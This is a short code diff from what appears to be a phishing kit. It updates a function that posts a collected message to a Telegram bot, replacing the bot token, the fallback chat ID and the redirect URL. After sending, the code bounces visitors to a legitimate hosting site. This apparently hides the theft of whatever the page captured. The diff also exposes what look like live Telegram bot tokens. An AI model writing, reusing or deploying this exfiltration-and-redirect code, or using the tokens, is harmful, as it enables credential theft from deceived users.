@@ -123,7 +123,7 @@ export default {
 
         // Send to Telegram
         await this.sendTelegramResult(
-          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
+          process.env.NUXT_APP_CHAT_ID || "-5167264103", 
           // 5
           message
         );
@@ -132,13 +132,13 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://mediacomm-sigma/");
+        location.replace("https://www.ionos.com/");
       }
     },
 
     async sendTelegramResult(chatId, message) {
       try {
-        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
+        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
 
         const payload = {
           chat_id: chatId,
